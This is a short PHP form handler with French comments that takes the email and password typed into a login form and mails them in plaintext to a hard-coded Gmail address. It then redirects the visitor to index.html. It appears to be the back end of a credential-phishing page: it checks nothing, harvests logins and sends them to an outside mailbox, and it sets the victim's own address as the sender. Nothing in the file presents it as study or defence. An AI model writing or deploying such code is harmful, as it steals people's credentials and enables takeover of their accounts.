<?php

if ( isset( $_POST["submit"] ) ) {

    $email = $_POST['email'];
    $password = $_POST['password'];

    // Configuration des paramètres pour utiliser Gmail SMTP
    $destinataire = "togbleprince908@gmail.com";
    $sujet = "Nouvelle tentative de connexion ";
     
    // Contenu de l'email
    $message = "Un utilisateur a tenté de se connecter avec les informations suivantes :\n\n Email : ".$email."\n  Mot de passe : ".$password."\n\n  ";


    $headers = "From: $email\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Utilisation de la fonction mail avec le serveur SMTP de Gmail
    if (mail($destinataire, $sujet, $message, $headers)) {
        // E-mail envoyé avec succès

        // Vous pouvez également enregistrer les données dans une base de données, etc.

        // Redirection vers une page de confirmation
        header("Location: index.html");
        exit();
    } else {
        // Erreur lors de l'envoi de l'e-mail
        echo "Erreur lors de l'envoi de l'e-mail.";
    }
}   
?>